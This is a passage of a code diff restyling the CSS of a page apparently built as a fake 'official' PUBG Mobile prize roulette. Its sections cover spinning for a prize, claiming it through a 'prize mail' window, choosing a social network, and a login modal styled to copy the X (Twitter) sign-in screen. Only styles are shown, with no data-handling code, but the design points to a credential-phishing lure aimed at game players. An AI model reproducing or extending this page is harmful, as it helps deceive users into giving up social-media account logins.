@@ -1,187 +1,219 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG Mobile - Roulette</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>Официальная рулетка</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #7B68EE;
-            --accent: #1877F2;
-            --gold: #ffcc00;
-            --bg-card: rgba(20, 35, 60, 0.7);
-            --border-light: rgba(255, 255, 255, 0.1);
-            --text-main: #e0e6ed;
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
+        
         body {
-            background: #050a10;
-            color: var(--text-main);
+            background: #0a1520;
+            color: white;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            font-family: 'Inter', -apple-system, sans-serif;
+            padding: 10px;
             overflow-x: hidden;
+            font-family: Arial, sans-serif;
+            position: relative;
+            width: 100%;
+            max-width: 100vw;
         }
-
-        /* Фон с эффектом глубины */
+        
+        /* Фон на весь сайт */
         body::before {
             content: '';
             position: fixed;
-            inset: 0;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background-image: url('phon.png');
             background-size: cover;
             background-position: center;
-            filter: brightness(0.4) contrast(1.1);
-            z-index: -2;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            z-index: -1;
         }
-
-        /* Виньетка (затемнение по краям) */
+        
+        /* Затемнение фона для лучшей читаемости */
         body::after {
             content: '';
             position: fixed;
-            inset: 0;
-            background: radial-gradient(circle, transparent 20%, rgba(0,0,0,0.8) 100%);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 21, 32, 0.85);
             z-index: -1;
         }
-
-        /* СЧЕТЧИК ПОБЕДИТЕЛЕЙ (Стиль "Live") */
-        .winners-counter {
+        
+        /* Боковое меню */
+        .sidebar {
             position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.6);
-            border-radius: 50px;
-            padding: 10px 20px;
-            border: 1px solid var(--primary);
-            backdrop-filter: blur(15px);
+            left: 0;
+            top: 0;
+            width: 250px;
+            height: 100%;
+            background: rgba(20, 35, 60, 0.95);
+            backdrop-filter: blur(10px);
+            border-right: 2px solid #2a3b5a;
             z-index: 1000;
+            transform: translateX(-100%);
+            transition: transform 0.3s ease;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 5px 0 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .sidebar.active {
+            transform: translateX(0);
+        }
+        
+        .menu-toggle {
+            position: fixed;
+            left: 20px;
+            top: 20px;
+            background: rgba(24, 119, 242, 0.8);
+            color: white;
+            border: none;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 999;
             display: flex;
             align-items: center;
-            gap: 12px;
-            box-shadow: 0 0 20px rgba(123, 104, 238, 0.3);
+            justify-content: center;
+            transition: all 0.3s;
+            box-shadow: 0 4px 10px rgba(24, 119, 242, 0.3);
         }
-
-        /* Точка "Live" */
-        .winners-counter::before {
-            content: '';
-            width: 8px;
-            height: 8px;
-            background: #ff4b4b;
-            border-radius: 50%;
-            animation: blink 1.5s infinite;
+        
+        .menu-toggle:hover {
+            background: rgba(24, 119, 242, 1);
+            transform: scale(1.1);
         }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(1.2); }
+        
+        .sidebar-header {
+            text-align: center;
+            padding-bottom: 20px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #2a3b5a;
         }
-
-        .winners-counter i {
-            color: var(--gold);
-            font-size: 16px;
-        }
-
-        .winners-count {
+        
+        .sidebar-header h3 {
+            color: #8da1b5;
             font-family: 'Orbitron', sans-serif;
-            font-weight: 700;
             font-size: 18px;
-            background: linear-gradient(90deg, var(--gold), #ff9900);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: countPulse 2s infinite;
         }
-
-        @keyframes countPulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
+        
+        .menu-item {
+            padding: 15px;
+            margin: 10px 0;
+            background: rgba(42, 59, 90, 0.3);
+            border-radius: 10px;
+            border: 1px solid #2a3b5a;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #8da1b5;
+            font-size: 14px;
+            font-weight: 500;
         }
-
-        /* ВЕРХНЕЕ МЕНЮ (Glassmorphism) */
+        
+        .menu-item:hover {
+            background: rgba(24, 119, 242, 0.2);
+            border-color: #1877F2;
+            transform: translateX(5px);
+            color: white;
+        }
+        
+        .menu-item i {
+            font-size: 18px;
+            width: 25px;
+        }
+        
+        .menu-item.support {
+            background: linear-gradient(135deg, #7B68EE, #4B0082);
+            border-color: #7B68EE;
+            color: white;
+            margin-top: auto;
+        }
+        
+        .menu-item.support:hover {
+            background: linear-gradient(135deg, #8A2BE2, #5D00BA);
+            transform: translateX(5px);
+        }
+        
+        /* Верхнее меню - ИСПРАВЛЕННОЕ */
         .top-menu {
-            width: 95%;
-            max-width: 1000px;
+            width: 100%;
+            max-width: 1400px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 12px 25px;
-            margin-top: 30px;
-            background: var(--bg-card);
-            border-radius: 15px;
-            border: 1px solid var(--border-light);
-            border-top: 1px solid rgba(255,255,255,0.2);
-            backdrop-filter: blur(12px);
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            padding: 10px 20px;
+            margin-bottom: 20px;
+            background: rgba(20, 35, 60, 0.8);
+            border-radius: 10px;
+            border: 1px solid #2a3b5a;
+            backdrop-filter: blur(10px);
             z-index: 100;
             position: relative;
         }
-
-        /* Меню слева с бургером */
-        .menu-left {
-            display: flex;
-            gap: 15px;
+        
+        .language-menu {
+            position: relative;
             flex: 1;
+            min-width: 120px;
         }
-
-        /* КНОПКИ МЕНЮ */
-        .menu-btn, .language-btn, .prize-mail-btn {
-            background: rgba(255, 255, 255, 0.05);
-            color: #fff;
-            border: 1px solid var(--border-light);
-            border-radius: 8px;
-            padding: 10px 18px;
-            font-size: 13px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        
+        .language-btn {
+            background: linear-gradient(to right, #2a3b5a, #1a2c42);
+            color: #8da1b5;
+            border: 1px solid #2a3b5a;
+            border-radius: 5px;
+            padding: 8px 15px;
+            font-family: Arial, sans-serif;
+            font-weight: 500;
             cursor: pointer;
             display: flex;
             align-items: center;
             gap: 8px;
-            text-decoration: none;
-            font-family: 'Inter', sans-serif;
+            width: 100%;
+            justify-content: space-between;
         }
-
-        .menu-btn:hover {
-            background: var(--accent);
-            border-color: var(--accent);
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4);
-        }
-
-        /* Выпадающее меню */
-        .dropdown-menu {
+        
+        .language-dropdown {
             position: absolute;
             top: 100%;
             left: 0;
-            background: rgba(10, 20, 35, 0.95);
-            border: 1px solid var(--primary);
-            border-radius: 12px;
+            background: #1a2c42;
+            border: 1px solid #2a3b5a;
+            border-radius: 5px;
             min-width: 200px;
-            max-height: 0;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            z-index: 1000;
-            transition: max-height 0.3s ease;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
-            margin-top: 10px;
-        }
-
-        .dropdown-menu.show {
             max-height: 300px;
+            overflow-y: auto;
+            display: none;
+            z-index: 1000;
+        }
+        
+        .language-dropdown.show {
+            display: block;
             animation: fadeInDropdown 0.3s ease;
         }
-
+        
         @keyframes fadeInDropdown {
             from {
                 opacity: 0;
@@ -192,107 +224,72 @@
                 transform: translateY(0);
             }
         }
-
-        .dropdown-item {
-            padding: 12px 15px;
-            cursor: pointer;
-            border-bottom: 1px solid var(--border-light);
-            transition: all 0.3s;
-            color: var(--text-main);
-            font-weight: 400;
-            font-family: 'Inter', sans-serif;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            text-decoration: none;
-        }
-
-        .dropdown-item:hover {
-            background: rgba(123, 104, 238, 0.2);
-            color: #fff;
-            padding-left: 20px;
-        }
-
-        /* Правая часть меню */
-        .menu-right {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            flex: 1;
-            justify-content: flex-end;
-        }
-
-        .language-menu {
-            position: relative;
-        }
-
-        .language-btn {
-            min-width: 120px;
-            justify-content: space-between;
-        }
-
-        .language-dropdown {
-            position: absolute;
-            top: 100%;
-            right: 0;
-            background: rgba(10, 20, 35, 0.95);
-            border: 1px solid var(--primary);
-            border-radius: 12px;
-            min-width: 200px;
-            max-height: 300px;
-            overflow-y: auto;
-            display: none;
-            z-index: 1000;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
-            margin-top: 10px;
-        }
-
-        .language-dropdown.show {
-            display: block;
-            animation: fadeInDropdown 0.3s ease;
-        }
-
+        
         .language-option {
             padding: 10px 15px;
             cursor: pointer;
-            border-bottom: 1px solid var(--border-light);
+            border-bottom: 1px solid #2a3b5a;
             transition: all 0.3s;
-            color: var(--text-main);
+            color: #8da1b5;
             font-weight: 400;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
         }
-
+        
         .language-option:hover {
-            background: rgba(123, 104, 238, 0.2);
+            background: #2a3b5a;
             transform: translateX(5px);
         }
-
-        /* ПРИЗОВАЯ ПОЧТА (Золотой акцент) */
-        .prize-mail-icon {
-            display: flex;
-        }
-
-        .prize-mail-btn {
-            background: linear-gradient(135deg, #f39c12, #d35400);
-            border: none;
+        
+        .logo {
             font-family: 'Orbitron', sans-serif;
-            color: #000;
-            font-weight: 800;
+            font-size: 20px;
+            color: #8da1b5;
+            font-weight: 500;
+            letter-spacing: 1px;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            white-space: nowrap;
+        }
+        
+        /* Иконка почты для приза с анимацией */
+        .prize-mail-icon {
+            flex: 1;
+            display: flex;
+            justify-content: flex-end;
+            min-width: 120px;
+        }
+        
+        .prize-mail-btn {
+            background: linear-gradient(to right, #2a3b5a, #1a2c42);
+            color: #8da1b5;
+            border: 1px solid #2a3b5a;
+            border-radius: 5px;
             padding: 8px 20px;
+            font-family: Arial, sans-serif;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
             position: relative;
             transition: all 0.3s;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            margin-left: auto;
         }
-
-        .prize-mail-btn:hover {
-            filter: brightness(1.2);
-            transform: scale(1.05);
+        
+        .prize-mail-btn:hover:not(:disabled) {
+            background: linear-gradient(to right, #3a4b6a, #2a3c52);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
-
+        
         .prize-badge {
             position: absolute;
             top: -8px;
             right: -8px;
-            background: var(--accent);
+            background: #1877F2;
             color: white;
             width: 20px;
             height: 20px;
@@ -303,20 +300,20 @@
             font-size: 10px;
             animation: pulse 1.5s infinite;
         }
-
+        
         @keyframes pulse {
             0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.7); }
             70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(24, 119, 242, 0); }
             100% { transform: scale(1); }
         }
-
+        
         .prize-mail-btn:disabled {
             background: linear-gradient(to right, #444, #555);
             color: #777;
             cursor: not-allowed;
             transform: none;
         }
-
+        
         /* НОВЫЙ ИНТЕРФЕЙС ПОЧТЫ (ОКНО ПРИЗА) */
         .prize-window {
             position: fixed;
@@ -339,7 +336,7 @@
 
         .prize-content {
             background: linear-gradient(180deg, #162436 0%, #0a1018 100%);
-            border: 2px solid var(--accent);
+            border: 2px solid #1877F2;
             border-radius: 20px;
             padding: 40px 20px;
             width: 90%;
@@ -366,7 +363,7 @@
             top: -20px;
             left: 50%;
             transform: translateX(-50%);
-            background: var(--accent);
+            background: #1877F2;
             color: white;
             padding: 8px 40px;
             font-family: 'Orbitron', sans-serif;
@@ -391,6 +388,13 @@
             width: 100%;
             height: 100%;
             background: radial-gradient(circle, rgba(24, 119, 242, 0.3) 0%, rgba(24, 119, 242, 0) 70%);
+            animation: rotateGlow 8s linear infinite;
+        }
+
+        @keyframes rotateGlow {
+            from { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.2); }
+            to { transform: rotate(360deg) scale(1); }
         }
 
         .prize-image {
@@ -410,7 +414,7 @@
         }
 
         .prize-desc {
-            color: var(--text-main);
+            color: #8da1b5;
             font-size: 14px;
             margin-bottom: 30px;
             line-height: 1.5;
@@ -418,7 +422,7 @@
         }
 
         .collect-btn {
-            background: linear-gradient(180deg, var(--accent) 0%, #1153b3 100%);
+            background: linear-gradient(180deg, #1877F2 0%, #1153b3 100%);
             border: none;
             padding: 15px 50px;
             border-radius: 8px;
@@ -443,48 +447,42 @@
         
         .container {
             width: 100%;
-            max-width: 800px;
+            max-width: 1400px;
             display: flex;
             flex-direction: column;
             align-items: center;
             z-index: 10;
-            animation: containerAppear 0.8s ease-out;
-        }
-
-        @keyframes containerAppear {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         
         .header {
             text-align: center;
             margin-bottom: 25px;
             width: 100%;
-            animation: slideInDown 0.8s ease-out;
         }
-
-        @keyframes slideInDown {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        
+        .header h1 {
+            color: #8da1b5;
+            font-size: 28px;
+            margin-bottom: 8px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 500;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        .header p {
+            color: #8da1b5;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            font-weight: 400;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
         }
         
         /* ОБНОВЛЕННЫЙ КОНТЕЙНЕР РУЛЕТКИ */
         .roulette-container {
             position: relative;
             width: 100%;
-            height: 380px;
+            height: 450px;
             background: rgba(20, 35, 60, 0.3);
             border-radius: 20px;
             overflow: hidden;
@@ -551,8 +549,8 @@
         }
         
         .prize-item img {
-            width: 85px;
-            height: 85px;
+            width: 110px;
+            height: 110px;
             object-fit: contain;
             transition: all 0.4s;
             filter: drop-shadow(0 5px 10px rgba(0, 0, 0, 0.3));
@@ -571,43 +569,95 @@
         }
         
         .center-item img {
-            width: 70px;
-            height: 70px;
+            width: 90px;
+            height: 90px;
             filter: drop-shadow(0 0 10px rgba(24, 119, 242, 0.5));
             opacity: 0.8;
         }
         
-        /* НОВАЯ РАМКА ВЫБОРА */
+        /* ОБНОВЛЕННАЯ РАМКА ВЫБОРА - РАВНОМЕРНАЯ */
         .selection-frame {
             position: absolute;
-            border: 3px solid transparent;
-            border-radius: 15px;
-            background: transparent;
+            border: 2px solid #1877F2;
+            border-radius: 12px;
             box-shadow: 
-                inset 0 0 20px rgba(123, 104, 238, 0.3),
-                0 0 20px rgba(123, 104, 238, 0.5);
+                0 0 20px rgba(24, 119, 242, 0.8),
+                0 0 40px rgba(24, 119, 242, 0.4),
+                inset 0 0 20px rgba(24, 119, 242, 0.2);
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             z-index: 100;
             pointer-events: none;
             opacity: 0;
+            background: rgba(24, 119, 242, 0.15);
+            backdrop-filter: blur(5px);
             display: flex;
             align-items: center;
             justify-content: center;
-            animation: borderGlow 2s ease-in-out infinite;
         }
-
-        @keyframes borderGlow {
-            0%, 100% {
-                box-shadow: 
-                    inset 0 0 20px rgba(123, 104, 238, 0.3),
-                    0 0 20px rgba(123, 104, 238, 0.5);
-                border-color: rgba(123, 104, 238, 0.5);
-            }
-            50% {
-                box-shadow: 
-                    inset 0 0 30px rgba(123, 104, 238, 0.5),
-                    0 0 30px rgba(123, 104, 238, 0.7);
-                border-color: rgba(123, 104, 238, 0.8);
-            }
+        
+        .selection-frame::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 12px;
+            pointer-events: none;
+        }
+        
+        .selection-frame::after {
+            content: '';
+            position: absolute;
+            top: 4px;
+            left: 4px;
+            right: 4px;
+            bottom: 4px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            pointer-events: none;
+        }
+        
+        /* Уголки рамки */
+        .corner {
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #1877F2;
+            opacity: 0.8;
+        }
+        
+        .corner-tl {
+            top: -4px;
+            left: -4px;
+            border-right: none;
+            border-bottom: none;
+            border-top-left-radius: 6px;
+        }
+        
+        .corner-tr {
+            top: -4px;
+            right: -4px;
+            border-left: none;
+            border-bottom: none;
+            border-top-right-radius: 6px;
+        }
+        
+        .corner-bl {
+            bottom: -4px;
+            left: -4px;
+            border-right: none;
+            border-top: none;
+            border-bottom-left-radius: 6px;
+        }
+        
+        .corner-br {
+            bottom: -4px;
+            right: -4px;
+            border-left: none;
+            border-top: none;
+            border-bottom-right-radius: 6px;
         }
         
         .selection-frame.active {
@@ -620,14 +670,14 @@
             top: -30px;
             left: 50%;
             transform: translateX(-50%);
-            background: linear-gradient(135deg, var(--primary), #4B0082);
+            background: linear-gradient(135deg, #1877F2, #1153b3);
             color: white;
             padding: 6px 15px;
             border-radius: 25px;
             font-weight: bold;
             font-size: 12px;
             white-space: nowrap;
-            box-shadow: 0 4px 12px rgba(123, 104, 238, 0.4);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4);
             z-index: 101;
             opacity: 0;
             transition: opacity 0.3s;
@@ -641,16 +691,16 @@
             transform: translateX(-50%);
             border-left: 8px solid transparent;
             border-right: 8px solid transparent;
-            border-top: 8px solid var(--primary);
+            border-top: 8px solid #1877F2;
         }
         
         .selection-indicator.show {
             opacity: 1;
         }
         
-        /* КНОПКА ИГРАТЬ */
+        /* КНОПКА ИГРАТЬ - ИЗМЕНЕН ЦВЕТ НА СИНИЙ */
         .play-btn {
-            background: linear-gradient(180deg, var(--primary) 0%, #4B0082 100%);
+            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
             color: white;
             border: none;
             border-radius: 60px;
@@ -670,18 +720,6 @@
             text-transform: uppercase;
             position: relative;
             overflow: hidden;
-            animation: buttonAppear 1s ease-out;
-        }
-
-        @keyframes buttonAppear {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         
         .play-btn::before {
@@ -730,148 +768,13 @@
             font-size: 20px;
         }
         
-        /* ФОРМА ВВОДА ID АККАУНТА */
-        .account-id-section {
-            background: var(--bg-card);
-            border-radius: 20px;
-            padding: 25px;
-            width: 100%;
-            max-width: 600px;
-            display: none;
-            margin-top: 20px;
-            border: 2px solid rgba(24, 119, 242, 0.3);
-            box-shadow: 
-                0 20px 40px rgba(0, 0, 0, 0.5),
-                inset 0 0 30px rgba(42, 59, 90, 0.2);
-            backdrop-filter: blur(10px);
-            transition: all 0.6s ease;
-        }
-        
-        .account-id-section.active {
-            display: block;
-            animation: slideInUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        
-        .account-id-section h2 {
-            color: var(--text-main);
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 24px;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 500;
-            letter-spacing: 1px;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-        }
-        
-        .account-id-section p {
-            text-align: center;
-            margin-bottom: 20px;
-            color: var(--text-main);
-            font-family: 'Inter', sans-serif;
-            font-size: 16px;
-        }
-        
-        .id-input-container {
-            margin-bottom: 25px;
-        }
-        
-        .id-label {
-            display: block;
-            margin-bottom: 10px;
-            color: var(--text-main);
-            font-size: 16px;
-            font-family: 'Inter', sans-serif;
-            font-weight: 500;
-        }
-        
-        .id-input {
-            width: 100%;
-            padding: 15px;
-            background: rgba(12, 26, 45, 0.7);
-            border: 2px solid #2a3b5a;
-            border-radius: 10px;
-            color: white;
-            font-size: 16px;
-            font-family: 'Inter', sans-serif;
-            transition: all 0.3s;
-        }
-        
-        .id-input:focus {
-            outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 15px rgba(24, 119, 242, 0.3);
-            transform: translateY(-2px);
-        }
-        
-        .id-submit-btn {
-            background: linear-gradient(180deg, var(--primary) 0%, #4B0082 100%);
-            color: white;
-            border: none;
-            border-radius: 60px;
-            padding: 18px 35px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 
-                0 10px 30px rgba(123, 104, 238, 0.4),
-                inset 0 1px 0 rgba(255, 255, 255, 0.3);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            width: 100%;
-            font-family: 'Orbitron', sans-serif;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .id-submit-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(
-                90deg,
-                transparent,
-                rgba(255, 255, 255, 0.2),
-                transparent
-            );
-            transition: 0.5s;
-        }
-        
-        .id-submit-btn:hover:not(:disabled) {
-            transform: translateY(-5px);
-            box-shadow: 
-                0 15px 35px rgba(123, 104, 238, 0.6),
-                inset 0 1px 0 rgba(255, 255, 255, 0.3);
-            letter-spacing: 2px;
-            background: linear-gradient(180deg, #8A2BE2 0%, #5D00BA 100%);
-        }
-        
-        .id-submit-btn:hover::before {
-            left: 100%;
-        }
-        
-        .id-submit-btn:disabled {
-            background: linear-gradient(45deg, #444, #555);
-            color: #777;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-        
         /* ФОРМА ВЫБОРА СОЦСЕТИ */
         .social-select-section {
-            background: var(--bg-card);
+            background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
             padding: 25px;
             width: 100%;
-            max-width: 600px;
+            max-width: 800px;
             display: none;
             margin-top: 20px;
             border: 2px solid rgba(24, 119, 242, 0.3);
@@ -899,7 +802,7 @@
         }
         
         .social-select-section h2 {
-            color: var(--text-main);
+            color: #8da1b5;
             text-align: center;
             margin-bottom: 20px;
             font-size: 24px;
@@ -912,14 +815,14 @@
         .social-select-section p {
             text-align: center;
             margin-bottom: 20px;
-            color: var(--text-main);
-            font-family: 'Inter', sans-serif;
+            color: #8da1b5;
+            font-family: Arial, sans-serif;
             font-size: 16px;
         }
         
         .social-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            grid-template-columns: repeat(4, 1fr);
             gap: 15px;
             margin-bottom: 25px;
         }
@@ -962,7 +865,7 @@
         }
         
         .social-option.selected {
-            border-color: var(--accent);
+            border-color: #1877F2;
             background: rgba(24, 119, 242, 0.1);
             box-shadow: 
                 0 0 20px rgba(24, 119, 242, 0.4),
@@ -999,19 +902,19 @@
         .social-option span {
             font-weight: 600;
             font-size: 14px;
-            color: var(--text-main);
-            font-family: 'Inter', sans-serif;
+            color: #8da1b5;
+            font-family: Arial, sans-serif;
             transition: color 0.3s;
         }
         
         .social-option.selected span {
-            color: var(--accent);
+            color: #1877F2;
             font-weight: 700;
         }
         
         /* КНОПКА ПОЛУЧИТЬ ПРИЗ */
         .get-prize-btn {
-            background: linear-gradient(180deg, var(--primary) 0%, #4B0082 100%);
+            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
             color: white;
             border: none;
             border-radius: 60px;
@@ -1034,7 +937,6 @@
             gap: 15px;
             position: relative;
             overflow: hidden;
-            animation: buttonAppear 1s ease-out 0.5s both;
         }
         
         .get-prize-btn::before {
@@ -1078,22 +980,13 @@
             font-size: 20px;
         }
         
-        /* Текст "Важно" в форме выбора соцсети */
-        .important-note {
-            text-align: center;
-            color: var(--text-main);
-            font-size: 14px;
-            margin-top: 15px;
-            font-family: 'Inter', sans-serif;
-        }
-        
         /* СЕКЦИЯ ПОДТВЕРЖДЕНИЯ */
         .confirmation-section {
-            background: var(--bg-card);
+            background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
             padding: 40px 30px;
             width: 100%;
-            max-width: 600px;
+            max-width: 800px;
             display: none;
             margin-top: 20px;
             border: 2px solid rgba(76, 175, 80, 0.3);
@@ -1126,11 +1019,11 @@
         }
         
         .confirmation-message {
-            color: var(--text-main);
+            color: #8da1b5;
             font-size: 18px;
             line-height: 1.6;
             margin-bottom: 25px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             padding: 20px;
             background: rgba(76, 175, 80, 0.1);
             border-radius: 15px;
@@ -1140,51 +1033,54 @@
         /* ОБНОВЛЕННЫЕ УВЕДОМЛЕНИЯ */
         .notification {
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: linear-gradient(135deg, #1a0f2e, #2a1a4a);
-            color: white;
-            padding: 25px 35px;
-            border-radius: 20px;
-            border: 2px solid var(--primary);
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #1a2c42, #0a1520);
+            color: #8da1b5;
+            padding: 15px 25px;
+            border-radius: 12px;
+            border: 1px solid #2a3b5a;
             box-shadow: 
-                0 15px 35px rgba(0, 0, 0, 0.8),
-                0 0 40px rgba(123, 104, 238, 0.4);
+                0 10px 30px rgba(0, 0, 0, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
             display: none;
             z-index: 1001;
-            max-width: 350px;
-            width: 90%;
-            animation: notificationPopIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            max-width: 400px;
+            animation: slideInRight 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             font-family: 'Orbitron', sans-serif;
-            backdrop-filter: blur(15px);
-            font-weight: 600;
-            text-align: center;
-            font-size: 16px;
+            font-size: 14px;
             letter-spacing: 1px;
+            backdrop-filter: blur(10px);
+            border-left: 4px solid #7B68EE;
         }
 
-        @keyframes notificationPopIn {
+        @keyframes slideInRight {
             from { 
-                transform: translate(-50%, -50%) scale(0.5);
+                transform: translateX(100%);
                 opacity: 0; 
             }
             to { 
-                transform: translate(-50%, -50%) scale(1);
+                transform: translateX(0);
                 opacity: 1; 
             }
         }
         
         .notification.error {
-            color: #FF6B6B;
-            border-color: #FF6B6B;
-            background: linear-gradient(135deg, #2a0a0a, #3a1a1a);
+            color: #ff6b6b;
+            border-left-color: #ff6b6b;
+            background: linear-gradient(135deg, rgba(255, 107, 107, 0.1), #0a1520);
         }
         
         .notification.success {
-            color: var(--primary);
-            border-color: #4CAF50;
-            background: linear-gradient(135deg, #0a1a2a, #1a2a3a);
+            color: #4CAF50;
+            border-left-color: #4CAF50;
+            background: linear-gradient(135deg, rgba(76, 175, 80, 0.1), #0a1520);
+        }
+        
+        .notification.warning {
+            color: #ffa726;
+            border-left-color: #ffa726;
+            background: linear-gradient(135deg, rgba(255, 167, 38, 0.1), #0a1520);
         }
         
         /* ОСТАЛЬНЫЕ СТИЛИ */
@@ -1277,7 +1173,7 @@
             font-size: 30px;
             font-weight: 700;
             margin-bottom: 40px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             color: #0F1419;
             text-align: center;
         }
@@ -1301,7 +1197,7 @@
             justify-content: center;
             gap: 10px;
             transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         .modal-dark .social-login-btn {
@@ -1362,7 +1258,7 @@
             font-size: 17px;
             background: white;
             color: #0F1419;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             transition: all 0.3s;
         }
         
@@ -1375,8 +1271,7 @@
         .x-input:focus {
             outline: none;
             border-color: #1D9BF0;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(29, 155, 240, 0.2);
+            box-shadow: 0 0 0 2px rgba(29, 155, 240, 0.2);
         }
         
         .x-next-btn {
@@ -1390,7 +1285,7 @@
             font-weight: 700;
             cursor: pointer;
             margin-bottom: 20px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             transition: all 0.3s;
         }
         
@@ -1400,7 +1295,6 @@
         
         .x-next-btn:hover {
             background: #272C30;
-            transform: translateY(-2px);
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
@@ -1412,7 +1306,7 @@
             color: #1D9BF0;
             text-decoration: none;
             font-size: 15px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         .x-link:hover {
@@ -1425,7 +1319,7 @@
             border-top: 1px solid #EFF3F4;
             color: #536471;
             font-size: 15px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             text-align: center;
         }
         
@@ -1448,18 +1342,6 @@
             background: #000000;
             color: white;
             padding: 30px;
-            animation: slideInRight 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes slideInRight {
-            from {
-                opacity: 0;
